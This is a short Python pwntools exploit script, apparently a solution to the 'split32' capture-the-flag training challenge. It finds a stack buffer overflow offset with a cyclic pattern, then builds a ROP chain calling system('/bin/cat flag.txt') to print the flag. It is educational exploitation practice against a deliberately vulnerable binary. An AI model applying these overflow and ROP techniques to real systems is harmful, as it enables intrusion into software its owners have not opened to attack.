from pwn import *
from pprint import pprint

#context.log_level = 'DEBUG'
elf = ELF('./split32')
p = process('./split32')
# find offset
g = cyclic_gen()
t = g.get(300)
p.recv()
p.sendline(t)
p.recv()
eip = '0x6c616161'
eip = bytes.fromhex(eip[2:]).decode()  # 0x6c616161 -> laaa
offset = g.find(eip)[0]
log.info(f"offset: {offset}")
p.close()

# start exploit
p = process("./split32")
rop = ROP("./split32")
#pwnme = pack(0x80485ad, 32, 'little') # our execusive function ==
#system = pack(elf.sym['system'],32,'little') # can use rop.call instead
bin_cat = next(elf.search(b'/bin/cat flag.txt')) # don't need to pack
'''                                             # because it is just decimal like
print(bin_cat)  # debug system_addr
print(rop.dump()) # debug rop

payload = [
    b'A' * offset,
    system,
    b'BBBB',
    bin_cat
]
payload = b"".join(payload)
'''
rop.raw(b'A' * offset)
rop.call('system', [bin_cat])
payload = rop.chain()
log.info(f"ROP_chain:\n{rop.dump()}")
p.recv()
p.sendline(payload)
p.recvline()
log.success(f'flag: {p.recvline().decode()}')





